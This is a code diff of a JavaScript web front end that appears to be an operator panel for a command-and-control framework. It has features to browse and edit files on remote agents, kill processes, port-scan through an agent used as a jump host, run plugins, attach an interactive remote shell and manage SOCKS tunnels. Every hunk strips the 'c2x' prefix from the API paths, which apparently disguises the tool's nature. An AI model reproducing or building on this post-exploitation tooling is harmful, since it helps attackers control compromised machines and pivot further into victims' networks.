@@ -2907,7 +2907,7 @@ async function loadLibrary() {
         <span class="lib-file-name" title="${esc(f.path)}">${esc(f.name)}</span>
         <span class="lib-file-size">${fmtSize(f.size)}</span>
         <span class="lib-file-actions">
-          <a href="/api/c2x/library/${S.selectedAgent.id}/get/${encodeURIComponent(f.path)}?dl=1"
+          <a href="/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(f.path)}?dl=1"
              download="${esc(f.name)}" onclick="event.stopPropagation()" title="Download">⬇</a>
           <span onclick="event.stopPropagation();libRename('${esc(f.path)}','${esc(f.name)}')" title="Rename">✎</span>
           <span onclick="event.stopPropagation();libDelete('${esc(f.path)}')" title="Delete">🗑</span>
@@ -2947,12 +2947,12 @@ async function openFile(path, name, isText, isNote) {
 
   // Update header download link
   const dlBtn = document.getElementById("lib-header-dl");
-  dlBtn.href     = `/api/c2x/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}?dl=1`;
+  dlBtn.href     = `/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}?dl=1`;
   dlBtn.download = name;
 
   if (!isText) {
     // Binary file → show info pane only; user can download via the ⬇ button
-    const url = `/api/c2x/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}?dl=1`;
+    const url = `/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}?dl=1`;
     document.getElementById("lib-binary-pane").style.display = "flex";
     document.getElementById("lib-binary-name").textContent   = name;
     document.getElementById("lib-binary-path").textContent   = path;
@@ -2967,7 +2967,7 @@ async function openFile(path, name, isText, isNote) {
   }
 
   // Text file → editor
-  const r = await fetch(`/api/c2x/library/${S.selectedAgent.id}/read/${encodeURIComponent(path)}`);
+  const r = await fetch(`/api/library/${S.selectedAgent.id}/read/${encodeURIComponent(path)}`);
   if (!r.ok) {
     const errData = await r.json().catch(() => ({}));
     if (r.status === 413) {
@@ -2976,7 +2976,7 @@ async function openFile(path, name, isText, isNote) {
       document.getElementById("lib-binary-name").textContent   = name;
       document.getElementById("lib-binary-path").textContent   = path;
       const dlLink = document.getElementById("lib-binary-dl");
-      dlLink.href        = `/api/c2x/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}`;
+      dlLink.href        = `/api/library/${S.selectedAgent.id}/get/${encodeURIComponent(path)}`;
       dlLink.download    = name;
       dlLink.textContent = "⬇ Download (file too large to edit)";
       document.getElementById("lib-md-toggle").style.display = "none";
@@ -3027,7 +3027,7 @@ async function saveFile() {
   const content = document.getElementById("lib-textarea").value;
 
   const r = await fetch(
-    `/api/c2x/library/${S.selectedAgent.id}/write/${encodeURIComponent(LIB.currentPath)}`,
+    `/api/library/${S.selectedAgent.id}/write/${encodeURIComponent(LIB.currentPath)}`,
     { method: "PUT", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content }) }
   );
@@ -3085,7 +3085,7 @@ function toggleMdPreview() {
 
 async function newNote() {
   if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
-  const r = await fetch(`/api/c2x/library/${S.selectedAgent.id}/note`, { method: "POST" });
+  const r = await fetch(`/api/library/${S.selectedAgent.id}/note`, { method: "POST" });
   const d = await r.json();
   await loadLibrary();
   openFile(d.path, d.path.split("/").pop(), true, true);
@@ -3098,7 +3098,7 @@ async function newFile() {
   if (!name || !name.trim()) return;
   const fname = name.trim();
   const r = await fetch(
-    `/api/c2x/library/${S.selectedAgent.id}/write/${encodeURIComponent(fname)}`,
+    `/api/library/${S.selectedAgent.id}/write/${encodeURIComponent(fname)}`,
     { method: "PUT", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content: "" }) }
   );
@@ -3120,13 +3120,13 @@ async function libRename(path, oldName) {
   const newPath = dir + newName.trim();
 
   // Read old content
-  const r1 = await fetch(`/api/c2x/library/${S.selectedAgent.id}/read/${encodeURIComponent(path)}`);
+  const r1 = await fetch(`/api/library/${S.selectedAgent.id}/read/${encodeURIComponent(path)}`);
   if (!r1.ok) { toast("Cannot read file for rename", "error"); return; }
   const { content } = await r1.json();
 
   // Write to new path
   const r2 = await fetch(
-    `/api/c2x/library/${S.selectedAgent.id}/write/${encodeURIComponent(newPath)}`,
+    `/api/library/${S.selectedAgent.id}/write/${encodeURIComponent(newPath)}`,
     { method: "PUT", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content }) }
   );
@@ -3135,7 +3135,7 @@ async function libRename(path, oldName) {
 
   // Delete old
   await fetch(
-    `/api/c2x/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
+    `/api/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
     { method: "DELETE" }
   );
 
@@ -3169,7 +3169,7 @@ async function libDelete(path) {
   if (!confirm(`Delete ${path}?`)) return;
   if (LIB.currentPath === path) closeEditor();
   const r = await fetch(
-    `/api/c2x/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
+    `/api/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
     { method: "DELETE" }
   );
   const d = await r.json();
@@ -3184,7 +3184,7 @@ async function libDeleteCurrent() {
   const path = LIB.currentPath;
   closeEditor();
   const r = await fetch(
-    `/api/c2x/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
+    `/api/library/${S.selectedAgent.id}/delete/${encodeURIComponent(path)}`,
     { method: "DELETE" }
   );
   const d = await r.json();
@@ -4304,7 +4304,7 @@ async function procRefresh() {
   const aid = _agentOrToast(); if (!aid) return;
   const tbody = document.getElementById("proc-tbody");
   tbody.innerHTML = '<tr><td colspan="4" style="padding:16px;text-align:center;opacity:.55">加载中…</td></tr>';
-  const d = await _capi(`/api/c2x/proc?agent_id=${encodeURIComponent(aid)}`);
+  const d = await _capi(`/api/proc?agent_id=${encodeURIComponent(aid)}`);
   if (!d) return;
   if (!d.procs?.length) {
     tbody.innerHTML = '<tr><td colspan="4" style="padding:16px;text-align:center;opacity:.55">无进程数据</td></tr>';
@@ -4322,7 +4322,7 @@ async function procRefresh() {
 async function procKill(pid) {
   const aid = _agentOrToast(); if (!aid) return;
   if (!confirm(`Kill 进程 ${pid}？`)) return;
-  const d = await _capi("/api/c2x/proc/kill", {
+  const d = await _capi("/api/proc/kill", {
     method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ agent_id: aid, pid }),
   });
@@ -4337,7 +4337,7 @@ async function netScan() {
   if (!ports.length) { toast("端口列表为空", "error"); return; }
   const out = document.getElementById("net-out");
   out.textContent = `[*] 扫描 ${host}（${ports.length} 端口，目标机为跳板）…`;
-  const d = await _capi("/api/c2x/net/scan", {
+  const d = await _capi("/api/net/scan", {
     method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ agent_id: aid, host, ports }),
   });
@@ -4348,7 +4348,7 @@ async function netNetstat() {
   const aid = _agentOrToast(); if (!aid) return;
   const out = document.getElementById("net-out");
   out.textContent = "[*] 获取中…";
-  const d = await _capi("/api/c2x/net/netstat", {
+  const d = await _capi("/api/net/netstat", {
     method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ agent_id: aid }),
   });
@@ -4358,7 +4358,7 @@ async function netNetstat() {
 // ── 插件 ──
 async function pluginsRefresh() {
   const list = document.getElementById("plugin-list");
-  const d = await _capi("/api/c2x/plugins");
+  const d = await _capi("/api/plugins");
   if (!d) return;
   if (!d.plugins?.length) {
     list.innerHTML = '<div style="opacity:.55;padding:12px">无插件</div>';
@@ -4379,7 +4379,7 @@ async function pluginRun(id, name) {
   const out = document.getElementById("plugin-out");
   out.style.display = "block";
   out.textContent = `[*] 插件「${name}」执行中…`;
-  const d = await _capi("/api/c2x/plugins/run", {
+  const d = await _capi("/api/plugins/run", {
     method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ agent_id: aid, plugin_id: id }),
   });
@@ -4393,7 +4393,7 @@ async function pluginRun(id, name) {
 async function graphRefresh() {
   const aid = _agentOrToast(); if (!aid) return;
   const list = document.getElementById("graph-list");
-  const d = await _capi(`/api/c2x/graph?agent_id=${encodeURIComponent(aid)}`);
+  const d = await _capi(`/api/graph?agent_id=${encodeURIComponent(aid)}`);
   if (!d) return;
   if (!d.nodes?.length) {
     list.innerHTML = '<div style="opacity:.55;padding:12px">图暂空——执行命令/插件/采集后动作会自动入图</div>';
@@ -4435,7 +4435,7 @@ async function ptyConnect() {
   term.open(mount);
   PTY.term = term; PTY.agent = S.selectedAgent.id; PTY.cursor = 0; PTY.alive = true;
 
-  const d = await _capi("/api/c2x/wsshell/attach", {
+  const d = await _capi("/api/wsshell/attach", {
     method: "POST", headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ agent_id: PTY.agent, cols: Math.floor(mount.clientWidth / 8.4), rows: Math.floor(mount.clientHeight / 17) }),
   });
@@ -4459,7 +4459,7 @@ async function ptyConnect() {
   term.onData(data => {
     if (!PTY.ready) return;
     const b64 = btoa(String.fromCharCode(...new TextEncoder().encode(data)));
-    _capi("/api/c2x/wsshell/input", {
+    _capi("/api/wsshell/input", {
       method: "POST", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ agent_id: PTY.agent, sid: PTY.sid, data: b64 }),
     });
@@ -4470,7 +4470,7 @@ async function ptyConnect() {
 
 async function ptyPoll() {
   if (!PTY.sid || !PTY.term) return;
-  const d = await _capi(`/api/c2x/wsshell/stream?agent_id=${PTY.agent}&sid=${PTY.sid}&cursor=${PTY.cursor}`);
+  const d = await _capi(`/api/wsshell/stream?agent_id=${PTY.agent}&sid=${PTY.sid}&cursor=${PTY.cursor}`);
   if (!d) return;
   if (d.data) {
     const bin = atob(d.data);
@@ -4487,7 +4487,7 @@ async function ptyPoll() {
 
 async function ptyDisconnect(silent) {
   if (PTY.sid) {
-    await _capi("/api/c2x/wsshell/close", {
+    await _capi("/api/wsshell/close", {
       method: "POST", headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ agent_id: PTY.agent, sid: PTY.sid }),
     });
@@ -4508,7 +4508,7 @@ async function tunnelLoad() {
   const out = document.getElementById("tunnel-out");
   if (!out) return;
   out.textContent = "[*] 加载中…";
-  const d = await _capi("/api/c2x/tunnel/status");
+  const d = await _capi("/api/tunnel/status");
   if (!d) return;
   let md = "## SOCKS 隧道\n\n";
   const sk = d.socks || {};
@@ -4529,7 +4529,7 @@ async function p2ReportLoad() {
   if (!S.selectedAgent) { toast("先选择 Agent", "error"); return; }
   const el = document.getElementById("report-content");
   el.innerHTML = '<div style="color:var(--text-muted);padding:20px">Generating…</div>';
-  const d = await _capi(`/api/c2x/report/${S.selectedAgent.id}`);
+  const d = await _capi(`/api/report/${S.selectedAgent.id}`);
   if (!d) return;
   el.innerHTML = window.marked ? marked.parse(d.report || "") : `<pre>${d.report || ""}</pre>`;
 }
@@ -4537,7 +4537,7 @@ async function p2ReportLoad() {
 // 覆盖原 report 下载（原实现走 Flask fmt=md）
 async function reportDownload() {
   if (!S.selectedAgent) return;
-  const d = await _capi(`/api/c2x/report/${S.selectedAgent.id}`);
+  const d = await _capi(`/api/report/${S.selectedAgent.id}`);
   if (!d) return;
   const blob = new Blob([d.report || ""], { type: "text/markdown" });
   const a = document.createElement("a");
